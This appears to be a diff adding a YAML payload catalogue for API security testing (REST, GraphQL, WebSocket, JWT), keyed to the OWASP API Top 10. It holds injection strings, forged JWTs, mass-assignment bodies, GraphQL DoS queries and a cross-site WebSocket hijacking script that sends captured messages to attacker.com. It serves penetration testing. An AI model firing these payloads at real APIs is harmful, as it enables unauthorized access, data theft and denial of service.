@@ -1,0 +1,313 @@
+# API Security Testing
+# REST, GraphQL, gRPC, WebSocket
+
+category: "api-testing"
+owasp_2025: "A01, A05, A07"
+api_top_10: "OWASP API Security Top 10:2023"
+
+# ===== REST API TESTING =====
+rest_api:
+  broken_object_level_authorization:
+    description: "API1:2023 - IDOR on API resources"
+    test_cases:
+      - id: "API-BOLA-001"
+        method: "GET"
+        endpoint: "/api/users/{user_id}"
+        test: "Access other users' data by changing user_id"
+        payloads:
+          - "GET /api/users/1"
+          - "GET /api/users/2"
+          - "GET /api/users/admin"
+        expected: "403 Forbidden for unauthorized user_id"
+        vulnerable: "200 OK with other user's data"
+        
+      - id: "API-BOLA-002"
+        method: "PUT"
+        endpoint: "/api/orders/{order_id}"
+        test: "Modify other users' orders"
+        payloads:
+          - "PUT /api/orders/1001 {status: 'cancelled'}"
+        vulnerable: "Can cancel other users' orders"
+  
+  broken_authentication:
+    description: "API2:2023 - Weak auth mechanisms"
+    test_cases:
+      - id: "API-AUTH-001"
+        test: "JWT with none algorithm"
+        payload: |
+          {
+            "alg": "none",
+            "typ": "JWT"
+          }.{
+            "sub": "admin",
+            "role": "admin"
+          }.
+        vulnerable: "Token accepted without signature"
+        
+      - id: "API-AUTH-002"
+        test: "Weak JWT secret brute force"
+        tool: "hashcat -m 16500 jwt.txt wordlist.txt"
+        vulnerable: "JWT secret is weak (password123)"
+  
+  excessive_data_exposure:
+    description: "API3:2023 - API returns too much data"
+    test_cases:
+      - id: "API-EXPOSE-001"
+        endpoint: "/api/users/me"
+        test: "Check for sensitive fields in response"
+        expected: "Only public fields (name, email)"
+        vulnerable: "Returns password_hash, ssn, credit_card"
+        
+      - id: "API-EXPOSE-002"
+        endpoint: "/api/users?limit=100"
+        test: "Mass data retrieval"
+        vulnerable: "Can retrieve all users' data in one request"
+  
+  lack_of_resources_rate_limiting:
+    description: "API4:2023 - No rate limits"
+    test_cases:
+      - id: "API-RATE-001"
+        endpoint: "/api/login"
+        test: "Brute force without rate limit"
+        payloads: "Send 1000 requests in 1 minute"
+        expected: "429 Too Many Requests after N attempts"
+        vulnerable: "No rate limiting, brute force possible"
+        
+      - id: "API-RATE-002"
+        endpoint: "/api/export"
+        test: "Resource exhaustion"
+        payload: "GET /api/export?records=9999999"
+        vulnerable: "Accepts without limit, DoS possible"
+  
+  broken_function_level_authorization:
+    description: "API5:2023 - Access admin functions as user"
+    test_cases:
+      - id: "API-BFLA-001"
+        method: "DELETE"
+        endpoint: "/api/admin/users/{id}"
+        test: "Delete users as non-admin"
+        expected: "403 Forbidden or 404 Not Found"
+        vulnerable: "User can delete accounts"
+        
+      - id: "API-BFLA-002"
+        endpoint: "/api/admin/reports"
+        test: "Access admin endpoints"
+        vulnerable: "Regular users can access admin APIs"
+  
+  mass_assignment:
+    description: "API6:2023 - Bind user input to objects"
+    test_cases:
+      - id: "API-MASS-001"
+        method: "POST"
+        endpoint: "/api/users/register"
+        payload: |
+          {
+            "username": "test",
+            "email": "test@test.com",
+            "isAdmin": true,
+            "role": "admin"
+          }
+        vulnerable: "isAdmin and role fields accepted"
+        
+      - id: "API-MASS-002"
+        method: "PUT"
+        endpoint: "/api/profile/update"
+        payload: |
+          {
+            "name": "John",
+            "credits": 99999
+          }
+        vulnerable: "Can modify read-only fields"
+  
+  security_misconfiguration:
+    description: "API7:2023 - Misconfigurations"
+    test_cases:
+      - id: "API-CONFIG-001"
+        test: "Check for debug mode"
+        endpoints:
+          - "/api/debug"
+          - "/api/swagger"
+          - "/api/graphql"
+        vulnerable: "Debug endpoints exposed in production"
+        
+      - id: "API-CONFIG-002"
+        test: "CORS misconfiguration"
+        payload: "Origin: https://attacker.com"
+        vulnerable: "Access-Control-Allow-Origin: *"
+  
+  injection:
+    description: "API8:2023 - SQL, NoSQL, Command injection"
+    test_cases:
+      - id: "API-INJ-001"
+        endpoint: "/api/search?q={input}"
+        payload: "q=' OR '1'='1"
+        vulnerable: "SQL injection in search"
+        
+      - id: "API-INJ-002"
+        endpoint: "/api/users?filter={json}"
+        payload: '{"username": {"$ne": null}}'
+        vulnerable: "NoSQL injection"
+
+# ===== GRAPHQL TESTING =====
+graphql:
+  introspection:
+    description: "Query GraphQL schema (should be disabled in prod)"
+    query: |
+      {
+        __schema {
+          types {
+            name
+            fields {
+              name
+            }
+          }
+        }
+      }
+    vulnerable: "Full schema revealed"
+    
+  nested_queries:
+    description: "DoS via deeply nested queries"
+    query: |
+      {
+        user(id: 1) {
+          friends {
+            friends {
+              friends {
+                friends {
+                  friends {
+                    name
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    vulnerable: "No depth limiting, DoS possible"
+    
+  batch_attacks:
+    description: "Batch multiple queries in one request"
+    query: |
+      [
+        { "query": "{ user(id: 1) { email } }" },
+        { "query": "{ user(id: 2) { email } }" },
+        ... (1000 queries)
+      ]
+    vulnerable: "Rate limiting bypassed via batching"
+    
+  field_suggestions:
+    description: "Typo in field name reveals hidden fields"
+    query: |
+      {
+        user(id: 1) {
+          passwords  # Typo
+        }
+      }
+    response: "Did you mean: password, password_hash?"
+    vulnerable: "Hidden field names leaked"
+  
+  authorization_bypass:
+    description: "Access unauthorized fields"
+    query: |
+      {
+        user(id: 1) {
+          email
+          privateNotes
+          creditCard
+        }
+      }
+    vulnerable: "No field-level authorization"
+
+# ===== JWT ATTACKS =====
+# Primary JWT payloads in: payloads/auth/auth-bypass.yaml
+jwt_attacks:
+  reference: "See payloads/auth/auth-bypass.yaml for comprehensive JWT payloads"
+  
+  api_specific:
+    none_algorithm:
+      test: "JWT with none algorithm"
+      vulnerable: "Token accepted without signature"
+    
+    weak_secret:
+      test: "Weak JWT secret brute force"
+      tool: "hashcat -m 16500 jwt.txt wordlist.txt"
+    
+    claim_manipulation:
+      test: "Modify role/admin claims"
+      vulnerable: "Server trusts client-provided claims"
+
+# ===== VERSIONING BYPASS =====
+api_versioning:
+  - name: "Access old API version"
+    payloads:
+      - "/api/v1/users (old, vulnerable)"
+      - "/api/v2/users (new, patched)"
+    test: "Check if old version still active"
+    
+  - name: "Version in header"
+    payload: "API-Version: 1.0"
+    test: "Switch to vulnerable version via header"
+
+# ===== HTTP METHOD TAMPERING =====
+method_override:
+  - name: "Method override header"
+    payload: |
+      POST /api/users/123
+      X-HTTP-Method-Override: DELETE
+    vulnerable: "POST converted to DELETE, bypasses CORS"
+    
+  - name: "Hidden methods"
+    test: "Try all HTTP methods (OPTIONS, TRACE, CONNECT)"
+    payloads:
+      - "OPTIONS /api/admin"
+      - "TRACE /api/admin"
+
+# ===== WEBSOCKET TESTING =====
+websocket:
+  - name: "Missing authentication"
+    test: "Connect to WebSocket without auth"
+    vulnerable: "Connection accepted, can send/receive messages"
+    
+  - name: "Cross-Site WebSocket Hijacking (CSWH)"
+    payload: |
+      <script>
+      var ws = new WebSocket('wss://victim.com/chat');
+      ws.onmessage = function(e) {
+        fetch('https://attacker.com/steal?data=' + e.data);
+      };
+      </script>
+    vulnerable: "No origin validation"
+    
+  - name: "Message injection"
+    payload: '{"type":"system","msg":"Server going down in 5 min"}'
+    vulnerable: "Can send fake system messages"
+
+# ===== RESPONSE MANIPULATION =====
+response_manipulation:
+  - name: "Content-Type bypass"
+    payload: |
+      POST /api/sensitive
+      Content-Type: application/x-www-form-urlencoded
+      (instead of application/json)
+    vulnerable: "CORS bypass, different parser"
+    
+  - name: "Parameter pollution"
+    payload: "?id=1&id=2&id=3"
+    test: "How does API handle duplicate parameters?"
+
+# ===== TOOLS =====
+tools:
+  - "Postman / Insomnia"
+  - "Burp Suite (with API scanner)"
+  - "OWASP ZAP"
+  - "GraphQL Voyager (schema visualization)"
+  - "InQL (GraphQL scanner)"
+  - "jwt_tool (JWT manipulation)"
+  - "Arjun (HTTP parameter discovery)"
+  - "Kiterunner (API endpoint discovery)"
+
+references:
+  - "OWASP API Security Top 10:2023"
+  - "OWASP Top 10:2025"
+  - "GraphQL Security Best Practices"
+  - "JWT RFC 7519"
